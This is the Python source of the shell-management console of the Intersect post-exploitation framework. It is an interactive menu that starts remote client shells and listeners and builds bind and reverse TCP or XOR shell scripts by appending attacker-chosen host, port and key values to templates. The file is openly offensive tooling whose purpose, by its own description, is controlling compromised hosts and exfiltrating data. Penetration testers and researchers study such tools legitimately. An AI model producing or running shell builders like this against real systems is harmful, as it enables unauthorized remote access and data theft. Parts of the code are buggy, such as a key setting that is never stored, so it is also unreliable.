#!/usr/bin/python
# Shell Management Utility
# Intersect Framework (c) 2012
# https://ohdae.github.com/Intersect-2.5/

import os, sys, re
from src import core
from src import shells
import string
import signal
import shutil


Templates = ("src/Templates/remote/")
Scripts = ("Scripts/")
active_sessions = {}
tab_complete = True

try:
    import readline
except ImportError:
    print "[!] Python readline is not installed. Tab completion will be disabled."
    tab_complete = False
    core.logging.info("Python Readline library not installed. Tab completion is disabled.")

if tab_complete == True:
    readline.parse_and_bind("tab: complete")


def about_dialog():
    print """\n
                Intersect Framework
                  revision 2.5.5
              created by bindshell labs
    
    Intersect is a post-exploitation framework written in Python.
    The purpose of this framework and the included modules are to
    assist penetration testers in automating and controlling many
    post-exploitation and data exfiltration tasks. There is full
    documentation, guides and license information available in the
    Docs directory.
    
    Using the Management application, you can interact with remote
    targets that are running an Intersect shell, whether they are
    serving a client or listener. You can interact with multiple
    remote targets at once, setup listeners to accept multiple
    connections and execute Intersect modules remotely.\n
    """


def show_active(): # TODO: Implement the multi-session stuff here.
    print("\nActive shell sessions: ")
    for key, value in active_sessions.iteritems():
        print "%s-%s" % (key, value)


class Completer:
    def __init__(self):
        self.words = ["help", "about", "client", "clear", "listener", "files", "exit",
                        "exec", "download", "upload", "mods", "quit", "info", "killme", "build"
                        "addr", "port", "name", "key", "view", "type" ]
        self.prefix = ":"

    def complete(self, prefix, index):
        if prefix != self.prefix:
            self.matching_words = [w for w in self.words if w.startswith(prefix)]
            self.prefix = prefix
        else:
            pass
        try:
            return self.matching_words[index]
            return self.match_mods[index]
        except IndexError:
            return None
                
                
class manage(object):
    def __init__(self):
        self.header = " => "
        self.warning = " [!] "
        signal.signal(signal.SIGINT, core.signalHandler)


    def main(self): # Central menu of this application
        print """
Intersect Framework - Shell Management
--------------------------------------
For a complete list of commands type :help
\n\n"""

        
        while True:

            if tab_complete == True:
                completer = Completer()
                readline.set_completer(completer.complete)
                
            command = raw_input(" intersect %s " % (self.header))
        
            if command == (":client"):
                build.client()
                    
            elif command == (":listener"):
                build.listener()
                
            elif command == (":build"):
                build.server()
                
            elif command == (":help"):
                print("\n\n     :about  =>  display the 'about' dialog")
                print("     :clear  =>  clears the screen")
                print("    :client  =>  start new client")
                print("     :build  =>  build server-side handler ")
                print("      :help  =>  show this help menu")
                print("  :listener  =>  start new listener")
                print("      :exit  =>  exit Intersect completely\n")    
            
            elif command == (":about"):
                about_dialog()
                
            elif command == (":exit"):
                print("[!] Shutting down Intersect!")
                sys.exit(0)
                
            elif command == (":quit"):
                print("[!] Shutting down Intersect!")
                sys.exit(0)
                                        
            elif command == (":clear"):
                os.system("clear")
                
            else:
                print(" %s Invalid Command!" % (self.warning))


class build:
    def __init__(self):
        self.header = " => "
        self.warning = " [!] "
        self.HOST = ""
        self.PORT = ""
        self.type = ""
        self.name = ""
        self.pkey = ""
        self.clients = [ "tcp", "xor", "udp" ]
        self.listeners = [ "tcp", "xor", "aes" ]
        
        
    def valid_ip(self, ip):
        parts = ip.split('.')
        return (
            len(parts) == 4
            and all(part.isdigit() for part in parts)
            and all(0 <= int(part) <= 255 for part in parts)
            )
        
        
    def client(self):
        os.system("clear")
        print("\nConfigure your client settings")
        print("Type :help for all commands")
        
        while True:
            
            option = raw_input(" client %s" % (self.header))
            
            if option == (":help"):
                print("\n")
                print("     :type  =>  shell type [tcp, xor, udp]")
                print("   :addr i  =>  remote IP")
                print("   :port p  =>  remote port")
                print("   :name n  =>  session name")
                print("    :key k  =>  xor private key [optional]")
                print("    :start  =>  start client shell")
                print("     :view  =>  display current settings")
                print("     :help  =>  view this menu")
                print("    :clear  =>  clears the screen")
                print("     :exit  =>  return to main menu\n")
                
            elif option.startswith(":type"):
                type = option.split(" ")
                type = type[1]
                if type in self.clients:
                    self.type = type
                    print("type: %s" % self.type)
                else:
                    print("[!] invalid type!")
                    
            elif option.startswith(":addr"):
                ip = option.split(" ")
                ip = ip[1]
                if self.valid_ip(ip):
                    self.HOST = ip
                    print("ip address: %s" % self.HOST)
                else:
                    print("[!] invalid IPv4 address!")
                    
            elif option.startswith(":port"):
                port = option.split(" ")
                port = port[1]
                if port.isdigit():
                    self.PORT = port
                    print("port: %s" % self.PORT)
                else:
                    print("[!] invalid port number!")
                    self.PORT = ""
                    
            elif option.startswith(":name"):
                name = option.split(" ")
                self.name = name[1]
                print("name: %s" % self.name)
                
            elif option.startswith(":key"):
                key = option.split(" ")
                pkey = key[1]
                print("key: %s" % pkey)
                
            elif option == (":exit"):
                manage.main()
                
            elif option == (":quit"):
                manage.main()
                
            elif option == (":view"):
                print("\nName: %s" % self.name)
                print("Shell: %s" % self.type)
                print("Host: %s" % self.HOST)
                print("Port: %s" % self.PORT)
                print("Key: %s\n" % self.pkey)
                
            elif option.startswith(":start"):
                if self.valid_ip(self.HOST):
                    if self.PORT.isdigit():
                        if self.name != "":
                            if self.type == "tcp":
                                shells.tcp.client(self.HOST, self.PORT, self.name)
                            elif self.type == "xor":
                                shells.xor.client(self.HOST, self.PORT, self.name, self.pkey)
                        else:
                            print("[!] enter session name!")
                    else:
                        print("[!] invalid port number!")
                else:
                    print("[!] invalid IPv4 address!")
                    
            elif option == (":clear"):
                os.system("clear")
                    
            else:
                print("[!] invalid option!")
                    
                    
    def listener(self):
        os.system("clear")
        print("\nConfigure your listener settings")
        print("Type :help for all commands")
        
        while True:
            
            option = raw_input(" client %s" % (self.header))
            
            if option == (":help"):
                print("\nAvailable Options: ")
                print("     :type  =>  shell type [tcp, xor, aeshttp]")
                print("   :addr i  =>  local IP")
                print("   :port p  =>  local port")
                print("   :name n  =>  session name")
                print("    :key k  =>  xor private key [optional]")
                print("    :start  =>  start listener shell")
                print("     :view  =>  display current settings")
                print("     :help  =>  view this menu")
                print("    :clear  =>  clears the screen")
                print("     :exit  =>  return to main menu")
                
            elif option.startswith(":type"):
                type = option.split(" ")
                type = type[1]
                if type in self.listeners:
                    print("accepted.")
                    self.type = type
                else:
                    print("[!] invalid type!")
                    
            elif option.startswith(":addr"):
                ip = option.split(" ")
                ip = ip[1]
                if self.valid_ip(ip):
                    print("accepted.")
                    self.HOST = ip
                else:
                    print("[!] invalid IPv4 address!")
                    
            elif option.startswith(":port"):
                port = option.split(" ")
                port = port[1]
                if port.isdigit():
                    print("accepted.")
                    self.PORT = port
                else:
                    print("[!] invalid port number!")
                    self.PORT = ""
                    
            elif option.startswith(":name"):
                name = option.split(" ")
                self.name = name[1]
                print("accepted.")
                
            elif option.startswith(":key"):
                key = option.split(" ")
                pkey = key[1]
                
            elif option == (":exit"):
                manage.main()
                
            elif option == (":quit"):
                manage.main()
                
            elif option == (":view"):
                print("\nName: %s" % self.name)
                print("Shell: %s" % self.type)
                print("Host: %s" % self.HOST)
                print("Port: %s" % self.PORT)
                print("Key: %s\n" % self.pkey)
                
            elif option.startswith(":start"):
                if self.valid_ip(self.HOST):
                    if self.PORT.isdigit():
                        if self.name != "":
                            if self.type == "tcp":
                                shells.tcp.server(self.HOST, self.PORT, self.name)
                            elif self.type == "xor":
                                shells.xor.server(self.HOST, self.PORT, self.name, self.pkey)
                            elif self.type == "aeshttp":
                                print("[!] aeshttp listener not yet implemented!")
                        else:
                            print("[!] enter session name!")
                    else:
                        print("[!] invalid port number!")
                else:
                    print("[!] invalid IPv4 address!")
                                        
            elif option == (":clear"):
                os.system("clear")
                    
            else:
                print("[!] invalid option!")


    def server(self):
        print("Build server-side handler")
        print("""
              1 => TCP bind
              2 => TCP reverse
              3 => XOR TCP bind
              4 => XOR TCP reverse
              5 => Return to Main Menu

              """)
              
              
        while True:
            choice = raw_input(" build %s" % (self.header))
            
            signal.signal(signal.SIGINT, core.signalHandler)
                  
            if choice == "1":
                template = (Templates+"tcpbind.py")
                print("\nEnter a name for your new shell. The final product will be saved in the Scripts directory.")
                name = raw_input(" tcp-bind => ")
                if os.path.exists(Scripts+name):
                    print("[!] A file by this name all ready exists!")
                    build.server()
                else:
                    shutil.copy2(template, Scripts+name)
                
                host = raw_input(" bind IP => ")
                if self.valid_ip(host):
                    port = raw_input(" bind port => ")
                    if port.isdigit():
                        makeshell = open(Scripts+name, "a")
                        makeshell.write("\nHOST = '%s'" % host)
                        makeshell.write("\nPORT = %s" % port)
                        makeshell.write("\nconn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
                        makeshell.write("\nconn.bind((HOST, PORT))")
                        makeshell.write("\nconn.listen(5)")
                        makeshell.write("\naccept()")
                        makeshell.close()
                    
                        print("[+] New shell created!")
                        print("[+] Location: %s" % Scripts+name)
                        manage.main()
                    else:
                        print("[!] Invalid port!")
                        build.server()
                else:
                    print("[!] Invalid IPv4 address!")
                    build.server()
                
                
            elif choice == "2":
                template = (Templates+"tcprev.py")
                print("\nEnter a name for your new shell. The final product will be saved in the Scripts directory.")
                name = raw_input(" tcp-rev => ")
                if os.path.exists(Scripts+name):
                    print("[!] A file by this name all ready exists!")
                    build.server()
                else:
                    shutil.copy2(template, Scripts+name)
                
                host = raw_input(" listen IP => ")
                if self.valid_ip(host):
                    port = raw_input(" listen port => ")
                    if port.isdigit():
                        newshell = open(Scripts+name, "a")
                        newshell.write("\n    HOST = '%s'" % host)
                        newshell.write("\n    PORT = %s" % port)
                        newshell.write("\n\nglobalvars()")
                        newshell.write("\nmain()")
                        newshell.close()
                    
                        print("[+] New shell created!")
                        print("[+] Location: %s" % Scripts+name)
                        manage.main()
                    else:
                        print("[!] Invalid port!")
                        build.server()
                else:
                    print("[!] Invalid IPv4 address!")
                    build.server()
                                
            elif choice == "3":
                template = (Templates+"xorbind.py")
                print("\nEnter a name for your new shell. The final product will be saved in the Scripts directory.")
                name = raw_input(" xor-bind => ")
                if os.path.exists(Scripts+name):
                    print("[!] A file by this name all ready exists!")
                    build.server()
                else:
                    shutil.copy2(template, Scripts+name)
                
                host = raw_input(" bind IP => ")
                if self.valid_ip(host):
                    port = raw_input(" bind port => ")
                    pin = raw_input(" xor key => ")
                    if port.isdigit():
                        makeshell = open(Scripts+name, "a")
                        makeshell.write("\nHOST = '%s'" % host)
                        makeshell.write("\nPORT = %s" % port)
                        makeshell.write("\npin = '%s'" % pin)
                        makeshell.write("\nconn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
                        makeshell.write("\nconn.bind((HOST, PORT))")
                        makeshell.write("\nconn.listen(5)")
                        makeshell.write("\naccept()")
                        makeshell.close()
                    
                        print("[+] New shell created!")
                        print("[+] Location: %s" % Scripts+name)
                        manage.main()
                    else:
                        print("[!] Invalid port!")
                        build.server()
                else:
                    print("[!] Invalid IPv4 address!")
                    build.server()
                    
            elif choice == "4":
                template = (Templates+"xorrev.py")
                print("\nEnter a name for your new shell. The final product will be saved in the Scripts directory.")
                name = raw_input(" xor-rev => ")
                if os.path.exists(Scripts+name):
                    print("[!] A file by this name all ready exists!")
                    build.server()
                else:
                    shutil.copy2(template, Scripts+name)
                
                host = raw_input(" listen IP => ")
                if self.valid_ip(host):
                    port = raw_input(" listen port => ")
                    pin = raw_input(" xor key => ")
                    if port.isdigit():
                        makeshell = open(Scripts+name, "a")
                        makeshell.write("\n    HOST = '%s'" % host)
                        makeshell.write("\n    PORT = %s" % port)
                        makeshell.write("\n    pin = '%s'" % pin)
                        makeshell.write("\n\nglobalvars()")
                        makeshell.write("\nmain()")
                        makeshell.close()
                        makeshell.close()
                    
                        print("[+] New shell created!")
                        print("[+] Location: %s" % Scripts+name)
                        manage.main()
                    else:
                        print("[!] Invalid port!")
                        build.server()
                else:
                    print("[!] Invalid IPv4 address!")
                    build.server()
                
            elif choice == "5":
                os.system("clear")
                manage.main()
                
            else:
                print("%s Invalid option!" % (self.header))



if __name__=='__main__':
    core.banner()
    manage = manage()
    build = build()
    manage.main()

